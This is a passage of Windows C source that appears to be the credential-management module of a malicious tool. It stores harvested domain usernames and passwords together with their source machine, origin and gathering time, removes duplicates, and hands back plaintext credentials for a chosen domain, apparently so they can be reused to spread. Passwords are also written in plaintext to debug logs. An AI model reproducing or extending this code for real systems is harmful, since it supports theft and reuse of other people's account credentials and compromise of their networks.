	CRED_LIST_CHUNK *chunk;		// new node to be allocated and filled
	
	WCHAR wComputerNameBuff[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };	// internal buffer for compname
	DWORD dwLen;

	//DbgPrint("entered");

	_cmCheckInitInternals();

	if ((!acr) || (acr->dwLen != sizeof(ADD_CREDS_RECORD))) { DbgPrint("ERR: invalid input param"); return bRes; }

	if (!acr->wszSourceMachineName) {
		//DbgPrint("NOTE: no wszSourceMachineName passed, using current machine");
		dwLen = sizeof(wComputerNameBuff);
		if (GetComputerNameW((LPWSTR)&wComputerNameBuff, &dwLen)) {
			acr->wszSourceMachineName = (LPWSTR)&wComputerNameBuff;
			//DbgPrint("using [%ws] as wszSourceMachineName", &wComputerNameBuff);
		} else { DbgPrint("ERR: failed to GetComputerName(), le %04Xh", GetLastError()) }
	} // !wszSourceMachineName

	// prepare values for searching - fill AC_CALLBACK_PARAMS values
	acp.i64DomainUsernameHash = HashStringW(acr->wszUsername);
	if (acr->wszDomain) { acp.i64DomainUsernameHash ^= HashStringW(acr->wszDomain); } else { DbgPrint("WARN: no domain passed"); }

	if (acr->wszPassword) { acp.i64PasswordHash = HashStringW(acr->wszPassword); } else { DbgPrint("WARN: no password passed"); }
	acp.ceOrigin = acr->coOrigin;
	acp.ftGathered = acr->ftGathered;

	// enter lock
	EnterCriticalSection(&g_csListAccess);

		// call enumer and processor
		_cmEnumRecords(_cmcbAddCredentialsEnum, (LPVOID)&acp);

		// check if dup detected. NB: callback may remove any outdated records from chain, so it is safe to add here, if no dup detected
		if (!acp.bIsDuplicate) {

			// prepare new node and link it to chain
			//DbgPrint("preparing new node");
			chunk = (CRED_LIST_CHUNK *)my_alloc(sizeof(CRED_LIST_CHUNK));

			// move already calculated values
			chunk->cr.i64DomainUsernameHash = acp.i64DomainUsernameHash;
			chunk->cr.i64PasswordHash = acp.i64PasswordHash;
			chunk->cr.i64DomainHash = HashStringW(acr->wszDomain);

			// calc, move all others
			if (acr->wszDomain) { chunk->cr.i64DomainHash = HashStringW(acr->wszDomain); }
			if (acr->wszSourceMachineName) { chunk->cr.i64SourceMachineHash = HashStringW(acr->wszSourceMachineName); }
			chunk->cr.coOrigin = acr->coOrigin;
			chunk->cr.coOrigin2 = acr->coOrigin2;
			if (acr->bAccessLevel) { chunk->cr.bAccessLevel = acr->bAccessLevel; } else { chunk->cr.bAccessLevel = 1; }	// use level 1 by default
			chunk->cr.ftReceived = acr->ftReceived;
			chunk->cr.ftGathered = acr->ftGathered;
			cmebEncodeW(acr->wszSourceMachineName, &chunk->cr.ebSourceMachineName);
			cmebEncodeW(acr->wszDomain, &chunk->cr.ebDomain);
			cmebEncodeW(acr->wszUsername, &chunk->cr.ebUsername);
			cmebEncodeW(acr->wszPassword, &chunk->cr.ebPassword);

			DbgPrint("adding machine=[%ws] Domain=[%ws] u=[%ws] p=[%ws]", acr->wszSourceMachineName, acr->wszDomain, acr->wszUsername, acr->wszPassword);

			// link 
			//DbgPrint("linking to chain"); 
			_cmChainAddChunk(chunk);
			//DbgPrint("done");

			bRes = TRUE;

		} //else { DbgPrint("WARN: record decided to be a duplicate, no add"); }

	// exit lock 
	LeaveCriticalSection(&g_csListAccess);

	return bRes;
}

/*
	Searches passed array for a UINT64 value
	Returns TRUE if found
*/
BOOL _cmIsHashInContext(UINT64 iHash, MY_STREAM *msContext)
{
	BOOL bRes = FALSE;	// func result
	UINT64 *pi64;
	SIZE_T lCount;

	pi64 = (UINT64 *)msContext->pData;
	lCount = msContext->lDataLen / sizeof(UINT64);

	while (lCount) {

		if (*pi64 == iHash) { bRes = TRUE; break; }

		lCount--;
		pi64++;
	}


	return bRes;
}


// callback enum function for cmGetCredentialsForDomain()
BOOL CALLBACK _cmcbGetCredentialsForDomain(CRED_LIST_CHUNK *chunk, LPVOID pCallbackParams)
{
	BOOL bRes = TRUE;	// continue enum by default

	GCFD_CALLBACK_PARAMS *gcp = (GCFD_CALLBACK_PARAMS *)pCallbackParams;	// params from enum caller
	//DWORD dwLen;		// buff len, output len for cmebDecode() function

	LPWSTR wszUsername = NULL, wszPassword = NULL;	// allocated by cmebDecodeW() buffers

	DbgPrint("chunk->cr.i64DomainHash=%08X%08X gcp->i64DomainHash=%08X%08X",	(DWORD)(chunk->cr.i64DomainHash >> 32), (DWORD)(chunk->cr.i64DomainHash), 
																				(DWORD)(gcp->i64DomainHash >> 32), (DWORD)(gcp->i64DomainHash));

	if ((chunk->cr.i64DomainHash == gcp->i64DomainHash) || (!gcp->i64DomainHash)) {

		// query if this record was already returned according to passed CredsPassedContext structure
		if (!_cmIsHashInContext(chunk->cr.i64DomainUsernameHash, gcp->msEnumContext)) {

			// append hash to context
			gcp->msEnumContext->msWriteStream(gcp->msEnumContext, &chunk->cr.i64DomainUsernameHash, sizeof(UINT64));

			// check if access level of enuming chunk is greater than already found one's
			//if (chunk->cr.bAccessLevel > gcp->bAccessLevel) {

			DbgPrint("found match");
			gcp->bAccessLevel = chunk->cr.bAccessLevel;

			// decode u + p
			if (!(wszUsername = cmebDecodeW(&chunk->cr.ebUsername))) { DbgPrint("failed to decode username"); return bRes; }
			if (!(wszPassword = cmebDecodeW(&chunk->cr.ebPassword))) { DbgPrint("failed to decode pwd"); my_free(wszUsername);  return bRes; }

			// save results to output buffers
			//dwLen = 1024;
			//cmebDecode(&chunk->cr.ebUsername, gcp->wszUsernameOut, &dwLen);
			//dwLen = 1024;
			//cmebDecode(&chunk->cr.ebPassword, gcp->wszPasswordOut, &dwLen);
			lstrcpyW(gcp->wszUsernameOut, wszUsername);
			lstrcpyW(gcp->wszPasswordOut, wszPassword);

			// indicate we found a record
			gcp->bFound = TRUE;
			bRes = FALSE;	// stop enum right away

			my_free(wszUsername); my_free(wszPassword);

			//} // checked for a higher level access

		} // hash not in context yet

	} // found matching domain hash

	return bRes;
}


// searches local creds database for a suitable record
// NB: wszDomain may be NULL
BOOL cmGetCredentialsForDomain(LPWSTR wszDomain, LPWSTR wszUsernameOut, LPWSTR wszPasswordOut, MY_STREAM *msEnumContext)
{	
	BOOL bRes = FALSE;	// function result
	GCFD_CALLBACK_PARAMS gcp = { 0 }; // params structure to be passed to callback function

	if ((!wszUsernameOut) || (!wszPasswordOut) || (!msEnumContext)) { DbgPrint("ERR: invalid input params"); return bRes; }

	_cmCheckInitInternals();

	// prepare params to be passed
	if (wszDomain) { gcp.i64DomainHash = HashStringW(wszDomain); } else { DbgPrint("WARN: no domain specified"); }
	gcp.wszUsernameOut = wszUsernameOut;
	gcp.wszPasswordOut = wszPasswordOut;
	gcp.msEnumContext = msEnumContext;

	if (wszDomain) { DbgPrint("requested creds for domain [%ws]", wszDomain); } else { DbgPrint("request creds for ALL domain"); }

	// do enum with internal callback
	_cmEnumRecords(_cmcbGetCredentialsForDomain, (LPVOID)&gcp);

	// save result
	bRes = gcp.bFound;
	DbgPrint("bFound=%u", bRes);


	return bRes;
}

#endif